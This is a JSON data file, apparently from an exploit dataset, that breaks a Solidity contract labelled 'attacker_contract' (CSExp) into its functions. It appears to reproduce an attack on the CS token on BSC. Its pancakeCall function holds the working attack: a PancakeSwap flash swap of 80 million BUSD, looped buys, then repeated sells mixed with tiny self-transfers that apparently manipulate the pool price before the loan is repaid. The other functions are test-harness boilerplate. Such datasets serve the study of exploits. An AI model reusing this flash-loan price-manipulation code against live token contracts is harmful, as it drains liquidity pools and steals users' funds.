[
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        require(msg.sender == address(pair));\n        BUSD.approve(address(router), BUSD.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(CS);\n        for (uint256 i = 0; i < 99; ++i) {\n            router.swapTokensForExactTokens(\n                5000 ether, BUSD.balanceOf(address(this)), path, address(this), block.timestamp + 1000\n            );\n        }\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            BUSD.balanceOf(address(this)), 1, path, 0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5, block.timestamp + 1000\n        );\n        CS.approve(address(router), CS.balanceOf(address(this)));\n        path[0] = address(CS);\n        path[1] = address(BUSD);\n        while (CS.balanceOf(address(this)) >= 3000 ether) {\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                3000 ether, 1, path, address(this), block.timestamp + 1000\n            );\n            CS.transfer(address(this), 2);\n        }\n        BUSD.transfer(msg.sender, 80_240_000 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_466_976);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "testExp",
    "original_code": "    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n        pair.swap(80_000_000 ether, 0, address(this), bytes(\"123\"));\n        emit log_named_decimal_uint(\"[End] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]